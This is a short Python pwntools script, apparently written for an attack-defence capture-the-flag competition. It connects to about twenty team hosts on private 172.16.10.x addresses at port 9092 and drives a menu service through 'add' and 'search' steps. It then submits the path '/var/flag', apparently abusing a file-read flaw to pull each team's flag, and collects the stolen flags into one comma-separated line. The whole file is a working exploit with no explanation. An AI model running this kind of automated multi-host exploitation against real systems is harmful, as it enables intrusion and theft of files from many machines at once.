#!/usr/bin/python3
from pwn import *

teams = ["172.16.10.101", "172.16.10.102", "172.16.10.103", "172.16.10.104", "172.16.10.105", "172.16.10.106", "172.16.10.107", "172.16.10.108","172.16.10.109", "172.16.10.110", "172.16.10.111", "172.16.10.112", "172.16.10.113", "172.16.10.114", "172.16.10.115", "172.16.10.116", "172.16.10.118", "172.16.10.119", "172.16.10.120", "172.16.10.121", "172.16.10.122"]

flags = ""

for ip in teams:
	p = remote(ip, 9092)

	p.recvuntil(b': ')
	p.sendline(b'add')

	p.recvuntil(b': ')
	p.sendline(b'ihack')

	p.recvuntil(b': ')
	p.sendline(b'uitm')

	p.recvuntil(b': ')
	p.sendline(b'323')

	p.recvuntil(b': ')
	p.sendline(b'2022.0')

	p.recvuntil(b': ')
	p.sendline(b'search')

	p.recvuntil(b': ')
	p.sendline(b'aa323')

	p.sendline(b'/var/flag')

	flag = p.recvline()
	flag = str(flag[:-1])	
	flag = flag.strip("b'")
	flag = flag.strip("'")
	flag = flag.strip('"')

	flag = flag + ',' 
	flags = flags + flag

print(flags)